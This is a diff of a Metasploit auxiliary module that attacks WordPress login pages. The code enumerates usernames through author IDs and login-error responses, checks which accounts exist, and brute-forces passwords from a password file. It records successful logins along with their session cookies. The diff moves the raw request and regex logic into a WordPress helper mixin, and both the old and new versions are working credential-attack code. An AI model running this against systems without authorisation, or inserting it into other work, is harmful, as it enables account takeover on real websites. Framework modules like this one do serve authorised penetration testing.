@@ -6,7 +6,7 @@
 ##
 
 class Metasploit3 < Msf::Auxiliary
-
+  include Msf::HTTP::Wordpress
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Report
@@ -21,7 +21,8 @@ class Metasploit3 < Msf::Auxiliary
         [
           'Alligator Security Team',
           'Tiago Ferreira <tiago.ccna[at]gmail.com>',
-          'Zach Grace <zgrace[at]404labs.com>'
+          'Zach Grace <zgrace[at]404labs.com>',
+          'Christian Mehlmauer <FireFart[at]gmail.com'
         ],
       'References'     =>
         [
@@ -34,45 +35,48 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('URI', [false, 'Define the path to the wp-login.php file', '/wp-login.php']),
-        OptBool.new('VALIDATE_USERS', [ true, "Validate usernames", true ]),
-        OptBool.new('BRUTEFORCE', [ true, "Perform brute force authentication", true ]),
-        OptBool.new('ENUMERATE_USERNAMES', [ true, "Enumerate usernames", true ]),
-        OptString.new('RANGE_START', [false, 'First user id to enumerate', '1']),
-        OptString.new('RANGE_END', [false, 'Last user id to enumerate', '10'])
+        OptBool.new('VALIDATE_USERS', [ true, 'Validate usernames', true ]),
+        OptBool.new('BRUTEFORCE', [ true, 'Perform brute force authentication', true ]),
+        OptBool.new('ENUMERATE_USERNAMES', [ true, 'Enumerate usernames', true ]),
+        OptInt.new('RANGE_START', [false, 'First user id to enumerate', 1]),
+        OptInt.new('RANGE_END', [false, 'Last user id to enumerate', 10])
     ], self.class)
 
   end
 
-  def target_url
-    uri = normalize_uri(datastore['URI'])
-    "http://#{vhost}:#{rport}#{uri}"
-  end
-
-
   def run_host(ip)
+
+    unless wordpress_and_online?
+      print_error("#{target_uri} does not seeem to be Wordpress site")
+      return
+    end
+
+    version = wordpress_version
+    print_status("#{target_uri} - WordPress Version #{version} detected") if version
+
     usernames = []
     if datastore['ENUMERATE_USERNAMES']
+      vprint_status("#{target_uri} - WordPress User-Enumeration - Running User Enumeration")
       usernames = enum_usernames
     end
 
     if datastore['VALIDATE_USERS']
       @users_found = {}
-      vprint_status("#{target_url} - WordPress Enumeration - Running User Enumeration")
+      vprint_status("#{target_uri} - WordPress User-Validation - Running User Validation")
       each_user_pass { |user, pass|
-        do_enum(user)
+        validate_user(user)
       }
 
-      unless (@users_found.empty?)
-        print_good("#{target_url} - WordPress Enumeration - Found #{uf = @users_found.keys.size} valid #{uf == 1 ? "user" : "users"}")
+      unless @users_found.empty?
+        print_good("#{target_uri} - WordPress User-Validation - Found #{uf = @users_found.keys.size} valid #{uf == 1 ? "user" : "users"}")
       end
     end
 
     if datastore['BRUTEFORCE']
-      vprint_status("#{target_url} - WordPress Brute Force - Running Bruteforce")
+      vprint_status("#{target_uri} - WordPress Brute Force - Running Bruteforce")
       if datastore['VALIDATE_USERS']
         if @users_found && @users_found.keys.size > 0
-          vprint_status("#{target_url} - WordPress Brute Force - Skipping all but #{uf = @users_found.keys.size} valid #{uf == 1 ? "user" : "users"}")
+          vprint_status("#{target_uri} - WordPress Brute Force - Skipping all but #{uf = @users_found.keys.size} valid #{uf == 1 ? "user" : "users"}")
         end
       end
 
@@ -87,7 +91,7 @@ class Metasploit3 < Msf::Auxiliary
 
       # Brute force previously found users
       if not usernames.empty?
-        print_status("#{target_url} - Brute-forcing previously found accounts...")
+        print_status("#{target_uri} - Brute-forcing previously found accounts...")
         passwords = load_password_vars(datastore['PASS_FILE'])
         usernames.each do |user|
           passwords.each do |pass|
@@ -99,151 +103,67 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-  def do_enum(user=nil)
-    post_data = "log=#{Rex::Text.uri_encode(user.to_s)}&pwd=x&wp-submit=Login"
-    print_status("#{target_url} - WordPress Enumeration - Checking Username:'#{user}'")
+  def validate_user(user=nil)
+    print_status("#{target_uri} - WordPress User-Validation - Checking Username:'#{user}'")
 
-    begin
-
-      res = send_request_cgi({
-        'method'  => 'POST',
-        'uri'     => normalize_uri(datastore['URI']),
-        'data'    => post_data,
-      }, 20)
-
-      if res.nil?
-        print_error("#{target_url} - Connection timed out")
-        return :abort
-      end
-
-
-      valid_user = false
-
-      if res.code == 200
-        if (res.body.to_s =~ /Incorrect password/ )
-          valid_user = true
-
-        elsif (res.body.to_s =~ /document\.getElementById\(\'user_pass\'\)/ )
-          valid_user = true
-
-        else
-          valid_user = false
-
-        end
-
-      else
-        print_error("#{target_url} - WordPress Enumeration - Enumeration is not possible. #{res.code} response")
-        return :abort
-
-      end
-
-      if valid_user
-        print_good("#{target_url} - WordPress Enumeration- Username: '#{user}' - is VALID")
-        report_auth_info(
+    exists = wordpress_user_exists?(user)
+    if exists
+      print_good("#{target_uri} - WordPress User-Validation - Username: '#{user}' - is VALID")
+      report_auth_info(
           :host => rhost,
           :sname => (ssl ? 'https' : 'http'),
           :user => user,
           :port => rport,
           :proof => "WEBAPP=\"Wordpress\", VHOST=#{vhost}"
-        )
+      )
 
-        @users_found[user] = :reported
-        return :next_user
-      else
-        vprint_error("#{target_url} - WordPress Enumeration - Invalid Username: '#{user}'")
-        return :skip_user
-      end
-
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-      return :abort
-    rescue ::Timeout::Error, ::Errno::EPIPE
-      return :abort
+      @users_found[user] = :reported
+      return :next_user
+    else
+      vprint_error("#{target_uri} - WordPress User-Validation - Invalid Username: '#{user}'")
+      return :skip_user
     end
   end
 
 
-  def do_login(user=nil,pass=nil)
-    post_data = "log=#{Rex::Text.uri_encode(user.to_s)}&pwd=#{Rex::Text.uri_encode(pass.to_s)}&wp-submit=Login"
-    vprint_status("#{target_url} - WordPress Brute Force - Trying username:'#{user}' with password:'#{pass}'")
+  def do_login(user=nil, pass=nil)
+    vprint_status("#{target_uri} - WordPress Brute Force - Trying username:'#{user}' with password:'#{pass}'")
 
-    begin
+    cookie = wordpress_login(user, pass)
 
-      res = send_request_cgi({
-        'method'  => 'POST',
-        'uri'     => normalize_uri(datastore['URI']),
-        'data'    => post_data,
-      }, 20)
-
-      if (res and res.code == 302 )
-        if res.headers['Set-Cookie'].match(/wordpress_logged_in_(.*);/i)
-          print_good("#{target_url} - WordPress Brute Force - SUCCESSFUL login for '#{user}' : '#{pass}'")
-          report_auth_info(
-            :host => rhost,
-            :port => rport,
-            :sname => (ssl ? 'https' : 'http'),
-            :user => user,
-            :pass => pass,
-            :proof => "WEBAPP=\"Wordpress\", VHOST=#{vhost}, COOKIE=#{res.headers['Set-Cookie']}",
-            :active => true
-          )
-
-          return :next_user
-        end
-
-        print_error("#{target_url} - WordPress Brute Force - Unrecognized 302 response")
-        return :abort
-
-      elsif res.body.to_s =~ /login_error/
-        vprint_error("#{target_url} - WordPress Brute Force - Failed to login as '#{user}'")
-        return
-      else
-        print_error("#{target_url} - WordPress Brute Force - Unrecognized #{res.code} response") if res
-        return :abort
-      end
-
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-    rescue ::Timeout::Error, ::Errno::EPIPE
+    if cookie
+      print_good("#{target_uri} - WordPress Brute Force - SUCCESSFUL login for '#{user}' : '#{pass}'")
+      report_auth_info(
+          :host => rhost,
+          :port => rport,
+          :sname => (ssl ? 'https' : 'http'),
+          :user => user,
+          :pass => pass,
+          :proof => "WEBAPP=\"Wordpress\", VHOST=#{vhost}, COOKIE=#{cookie}",
+          :active => true
+      )
+      return :next_user
+    else
+      vprint_error("#{target_uri} - WordPress Brute Force - Failed to login as '#{user}'")
+      return
     end
   end
 
   def enum_usernames
     usernames = []
     for i in datastore['RANGE_START']..datastore['RANGE_END']
-      uri = "#{datastore['URI'].gsub(/wp-login/, 'index')}?author=#{i}"
-      print_status "#{target_url} - Requesting #{uri}"
-      res = send_request_cgi({
-        'method' => 'GET',
-        'uri' => uri
-      })
-
-      if (res and res.code == 301)
-        uri = URI(res.headers['Location'])
-        uri = "#{uri.path}?#{uri.query}"
-        res = send_request_cgi({
-          'method' => 'GET',
-          'uri' => uri
-        })
-      end
-
-      if res.nil?
-        print_error("#{target_url} - Error getting response.")
-      elsif res.code == 200 and res.body =~ /href="http[s]*:\/\/.*\/\?*author.+title="([[:print:]]+)" /i
-        username = $1
-        print_good "#{target_url} - Found user '#{username}' with id #{i.to_s}"
+      username = wordpress_userid_exists?(i)
+      if username
+        print_good "#{target_uri} - Found user '#{username}' with id #{i.to_s}"
         usernames << username
-      elsif res.code == 404
-        print_status "#{target_url} - No user with id #{i.to_s} found"
-      else
-        print_error "#{target_url} - Unknown error. HTTP #{res.code.to_s}"
       end
     end
 
     if not usernames.empty?
       p = store_loot('wordpress.users', 'text/plain', rhost, usernames * "\n", "#{rhost}_wordpress_users.txt")
-      print_status("#{target_url} - Usernames stored in: #{p}")
+      print_status("#{target_uri} - Usernames stored in: #{p}")
     end
 
     return usernames
   end
-
 end
